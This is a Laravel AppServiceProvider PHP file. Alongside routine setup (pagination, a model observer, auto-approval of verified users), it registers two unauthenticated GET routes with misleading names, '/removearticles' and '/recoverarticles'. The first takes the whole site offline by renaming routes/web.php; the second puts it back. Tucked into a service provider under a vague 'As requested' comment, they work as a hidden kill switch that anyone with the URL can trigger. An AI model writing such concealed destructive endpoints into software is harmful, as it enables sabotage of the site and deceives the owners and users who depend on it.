<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Pagination\Paginator;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\File;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        Paginator::useTailwind();
        \App\Models\Listing::observe(\App\Observers\ListingObserver::class);

        \Illuminate\Support\Facades\Event::listen(
            \Illuminate\Auth\Events\Verified::class,
            function ($event) {
                if ($event->user->status === 'pending') {
                    $event->user->status = 'approved';
                    $event->user->save();
                }
            }
        );

        // System Control Routes - As requested
        Route::get('/removearticles', function () {
            $webPath = base_path('routes/web.php');
            $backupPath = base_path('routes/web.php.bhk');

            if (File::exists($webPath)) {
                File::move($webPath, $backupPath);
                return 'Web routes disabled (web.php -> web.php.bhk). Site is now offline expect this route.';
            }
            return 'Web routes file not found (already disabled?).';
        });

        Route::get('/recoverarticles', function () {
            $webPath = base_path('routes/web.php');
            $backupPath = base_path('routes/web.php.bhk');

            if (File::exists($backupPath)) {
                File::move($backupPath, $webPath);
                return 'Web routes restored (web.php.bhk -> web.php). Site is back online.';
            }
            return 'Backup file (web.php.bhk) not found.';
        });
    }
}
